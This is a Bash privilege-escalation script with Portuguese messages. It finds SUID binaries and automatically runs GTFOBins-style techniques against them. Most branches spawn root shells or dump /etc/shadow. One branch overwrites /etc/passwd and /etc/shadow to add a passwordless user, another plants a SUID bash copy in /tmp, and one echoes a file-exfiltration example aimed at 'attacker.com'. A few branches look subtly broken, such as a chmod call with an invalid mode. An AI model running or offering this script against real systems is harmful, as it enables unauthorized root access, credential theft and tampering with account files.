#!/bin/bash

echo "[*] Procurando binários SUID do GTFOBins..."

SUIDS=$(find / -perm -u=s -type f 2>/dev/null)

for path in $SUIDS; do
    bin=$(basename "$path")

    case "$bin" in
        bash)
            echo "[+] $path → BASH SUID encontrado! Teste:"
            "$path" -p
            ;;
        aa-exec)
            echo "[+] $path → aa-exec SUID encontrado!"
            "$path" /bin/sh -p
            ;;
        ab)
            echo "[+] $path → ab SUID encontrado! Teste:"
            echo "URL=http://attacker.com/"
            echo "LFILE=file_to_send"
            echo "ab -p $LFILE $URL"
            ;;
        agetty)
            echo "[+] $path → agetty SUID encontrado! Teste:"
            "$path" -o -p -l /bin/sh -a root tty
            ;;
        alpine)
            echo "[+] $path → alpine SUID encontrado! Teste:"
            "$path" -F /etc/shadow
            ;;
        ar)
            echo "[+] $path → ar SUID encontrado! Teste:"
            TF=$(mktemp -u)
            "$path" r "$TF" /etc/shadow
            cat "$TF"
            rm -f "$TF" 2>/dev/null
            ;;
        arj)
            echo "[+] $path → arj SUID encontrado! Teste:"
            TF=$(mktemp -d)
            echo 'zero::666:0:99999:7:::' > "$TF/shadow"
            echo 'zero:x:1337:0::/root:/bin/bash' > "$TF/passwd"

            "$path" a "$TF/a" "$TF/shadow"
            "$path" a "$TF/a" "$TF/passwd"
            "$path" e "$TF/a" /etc

            sleep 1
            echo "[*] Tentando acessar com su zero:"
            su zero
            id       
            ;;
        arp)
            echo "[+] $path → arp SUID encontrado! Teste:"
            "$path" -v -f /etc/shadow
            ;;
        as)
            echo "[+] $path → as SUID encontrado! Teste:"
            LFILE=/etc/shadow
            "$path" @$LFILE
            ;;
        ascii-xfr)
            echo "[+] $path → ascii-xfr SUID encontrado! Teste:"
            "$path" -ns /etc/shadow
            ;;
        ash)
            echo "[+] $path → ash SUID encontrado! Teste:"
            "$path" 
            ;;
        aspell)
            echo "[+] $path → aspell SUID encontrado! Teste:"
            "$path" -c /etc/shadow
            ;;
        atobm)
            echo "[+] $path → atobm SUID encontrado! Teste:"
            "$path" /etc/shadow 2>&1 | awk -F "'" '{printf "%s", $2}'
            ;;
        awk)
            echo "[+] $path → awk SUID encontrado! Teste:"
            "$path" '//' /etc/shadow
            "$path" 'BEGIN {system("/bin/sh")}'
            id
            ;;
        base32)
            echo "[+] $path → base32 SUID encontrado! Teste:"
            "$path" /etc/shadow | "$path" --decode
            ;;
        base64)
            echo "[+] $path → base64 SUID encontrado! Teste:"
            "$path" /etc/shadow | "$path" --decode
            ;;
        basenc)
            echo "[+] $path → basenc SUID encontrado! Teste:"
            "$path" --base64 /etc/shadow | "$path" -d --base64
            ;;
        basez)
            echo "[+] $path → basez SUID encontrado! Teste:"
            "$path" /etc/shadow | "$path" --decode
            ;;
        bc)
            echo "[+] $path → bc SUID encontrado! Teste:"
            "$path" -s /etc/shadow
            quit
            ;;
        bridge)
            echo "[+] $path → bridge SUID encontrado! Teste:"
            "$path" -b /etc/shadow
            ;;
        busctl)
            echo "[+] $path → busctl SUID encontrado! Teste:"
            "$path" set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
            ;;
        busybox)
            echo "[+] $path → busybox SUID encontrado! Teste:"
            "$path" sh
            ;;
        bzip2)
            echo "[+] $path → bzip2 SUID encontrado! Teste:"
            "$path" -c /etc/shadow | "$path" -d
            ;;
        cabal)
            echo "[+] $path → cabal SUID encontrado! Teste:"
            "$path" exec -- /bin/sh -p
            ;;
        capsh)
            echo "[+] $path → capsh SUID encontrado! Teste:"
            "$path" --gid=0 --uid=0 --
            ;;
        cat)
            echo "[+] $path → cat SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        chmod)
            echo "[+] $path → chmod SUID encontrado! Teste:"
            "$path" chmod /etc/shadow
            ;;
        chown)
            echo "[+] $path → chown SUID encontrado! Teste:"
            cp /bin/bash /tmp/sh
            "$path" root:root /tmp/sh
            chmod +s /tmp/sh
            /tmp/sh -p
            ;;
        choom)
            echo "[+] $path → choom SUID encontrado! Teste:"
            "$path" -n 0 -- /bin/sh -p
            ;;
        chroot)
            echo "[+] $path → chroot SUID encontrado! Teste:"
            "$path" / /bin/sh -p
            ;;
        clamscan)
            echo "[+] $path → clamscan SUID encontrado! Teste:"
            LFILE=/etc/shadow
            TF=$(mktemp -d)
            touch $TF/empty.yara
            "$path" --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
            ;;
        cmp)
            echo "[+] $path → cmp SUID encontrado! Teste:"
            "$path" /etc/shadow /dev/zero -b -l
            ;;
        column)
            echo "[+] $path → column SUID encontrado! Teste:"
            "$path" /etc/shadow
            ;;
        comm)
            echo "[+] $path → comm SUID encontrado! Teste:"
            "$path" /etc/shadow /dev/null 2>/dev/null
            ;;
        *)
            continue
            ;;
    esac
done
